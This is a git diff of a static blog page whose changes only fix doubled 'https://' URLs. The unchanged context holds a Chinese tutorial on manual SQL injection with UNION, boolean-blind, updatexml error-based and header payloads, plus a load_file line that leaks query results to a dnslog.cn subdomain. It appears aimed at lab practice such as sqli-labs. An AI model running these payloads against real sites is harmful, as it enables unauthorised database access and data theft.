@@ -3,10 +3,10 @@
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>sql手动注入经验总结 | Gridea</title>
-<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1624178139382">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="sql手动注入经验总结 | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="sql手动注入经验总结 | Gridea - Atom Feed" href="https://jinqipiaopiao.github.io//atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -25,8 +25,8 @@
     <div class="main">
       <div class="main-content">
         <div class="site-header">
-  <a href="https://https://jinqipiaopiao.github.io/">
-  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  <a href="https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://jinqipiaopiao.github.io//images/avatar.png?v=1624178139382" alt="">
   </a>
   <h1 class="site-title">
     Gridea
@@ -111,7 +111,7 @@
 1.# 和 -- （有个空格）表示注释，可以使它们后面的语句不被执行。在url中，如果是get请求**(记住是get请求，也就是我们在浏览器中输入的url)** ，解释执行的时候，url中#号是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中不包括#，因此使用#闭合无法注释，会报错；而使用-- （有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用--+的方式来闭合，因为+会被解释成空格。
 
 2.当然，也可以使用--%20，把空格转换为urlencode编码格式，也不会报错。同理把#变成%23,也不报错。
-![](https://https://jinqipiaopiao.github.io//post-images/1617707627339.png)
+![](https://jinqipiaopiao.github.io//post-images/1617707627339.png)
 3.如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如我们在后台登录框中进行注入。
 
 4.为什么--后面必须要有空格，而#后面就不需要？
@@ -123,7 +123,7 @@
 原文链接：https://blog.csdn.net/weixin_43096078/article/details/108215076<br>
 }<br>
 <strong>1.基本知识</strong><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617706817761.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1617706817761.png" alt="" loading="lazy"><br>
 <strong>2.sql注入</strong><br>
 如何判断有无注入： and1=2<br>
 步骤：<br>
@@ -131,7 +131,7 @@
 2、通过order by 找出一共有多少列数。（报错数字前一个）id=1 order by 3 (前面不用加and)<br>
 3、利用union select 1,2,3 （一般用null取代）到那个数字 显示哪个数字证明那个数字是输出点 id=1 union select 1,2,3 (前面不用加and)<br>
 4、把输出点更换成对应函数测出库名，表名，字段，数据等<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617706854405.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1617706854405.png" alt="" loading="lazy"></p>
 <p>拓展<br>
 and 1=2 可更换成 id=1.1/999999 （报错即可）<br>
 limit1,1 第一个1代表列数，第二个1代表出现多少个结果</p>
@@ -141,8 +141,8 @@ limit1,1 第一个1代表列数，第二个1代表出现多少个结果</p>
 <strong>3.SQL盲注</strong><br>
 如何判断有无注入SQL盲注：同上<br>
 就是无法直观看到显示结果，通过对错判断是否猜解正确<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617706858755.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617706972624.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1617706858755.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1617706972624.png" alt="" loading="lazy"><br>
 利用burp爆破猜解<br>
 平常语句：</p>
 <pre><code>猜库名：
@@ -157,8 +157,8 @@ and substr((select table_name from information_schema.tables where table_schema=
 and substr((select column_name from information_schema.columns where table_name='loflag' limit 0,1),1,1)='i' 返回正常，说明loflag表中的列名称第一位是i
 </code></pre>
 <p>太麻烦了burp的intruder爆破猜解一步到位<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617707130799.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617707136581.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1617707130799.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1617707136581.png" alt="" loading="lazy"><br>
 具体步骤就把那几个输入改变点的可能字典集放到里面爆破就完事了<br>
 <strong>4.head注入</strong><br>
 如何判断有无head注入：拿head去另一个浏览器不登陆也能进该网站</p>
@@ -170,7 +170,7 @@ and substr((select column_name from information_schema.columns where table_name=
 ' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='flag_head' limit 1,1)),1),1) -- qwe
 ' or updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 0,1)),1),1) -- qwe
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617707246441.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1617707246441.png" alt="" loading="lazy"><br>
 拓展<br>
 updatexml() 更新xml文档的函数<br>
 语法：updatexml(目标xml内容，xml文档路径，更新的内容)<br>
@@ -183,7 +183,7 @@ updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)<br>
 利用这个网站构建要添加的子域名<br>
 像下面：select database()是查询语句 cp846m.dnslog.cn是子域名（记得前面加点）1.txt不存在只起到查询作用<br>
 and load_file(concat(’//’,(select database()),’.cp846m.dnslog.cn/1.txt’))<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617707339580.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1617707339580.png" alt="" loading="lazy"><br>
 查询语句结果可在该网看到</p>
 <p>拓展<br>
 LOAD_FILE：读取文件并返回文件内容为字符串<br>
@@ -203,7 +203,7 @@ LOAD_FILE：读取文件并返回文件内容为字符串<br>
         
           <div class="next-post">
             <div class="next">下一篇</div>
-            <a href="https://https://jinqipiaopiao.github.io/post/sqli-labs-1-22-chuang-guan/">
+            <a href="https://jinqipiaopiao.github.io/post/sqli-labs-1-22-chuang-guan/">
               <h3 class="post-title">
                 sqli-labs 基础知识
               </h3>
@@ -215,7 +215,7 @@ LOAD_FILE：读取文件并返回文件内容为字符串<br>
 
         <div class="site-footer">
   Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
-  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+  <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
